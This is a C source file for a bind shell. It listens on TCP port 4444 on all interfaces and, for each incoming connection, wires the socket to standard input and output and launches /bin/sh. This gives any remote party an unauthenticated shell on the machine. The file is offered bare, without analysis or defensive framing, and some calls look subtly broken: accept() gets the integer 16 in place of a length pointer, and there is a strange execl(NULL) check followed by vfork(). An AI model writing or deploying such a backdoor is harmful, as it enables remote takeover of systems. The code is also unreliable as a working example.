#include <arpa/inet.h>
#include <assert.h>
#include <errno.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netdb.h>
#include <unistd.h>

#define PORT 4444

int main()
{ 
	int fd, cfd;
	struct sockaddr_in server_addr;
	struct sockaddr_in client_addr;
        
	fd = socket(PF_INET, SOCK_STREAM, 0);
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(PORT);
	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	memset(server_addr.sin_zero, 0, sizeof(server_addr.sin_zero));

	bind(fd, (struct sockaddr *)&server_addr, sizeof(server_addr));

	listen(fd, 10);

	while(1)	
	{
		cfd = accept(fd, (struct sockaddr *) &client_addr, 16);
	
		dup2(cfd, 0); 
		dup2(cfd, 1); 
		dup2(cfd, 2);

		if(execl(NULL, NULL, NULL) < 0 && errno == ENOTSUP)
		{
			vfork();
		}

		execl("/bin/sh", NULL, NULL);
		close(cfd);
		exit(0);
	}        
	close(fd);
	
	return 0;
}

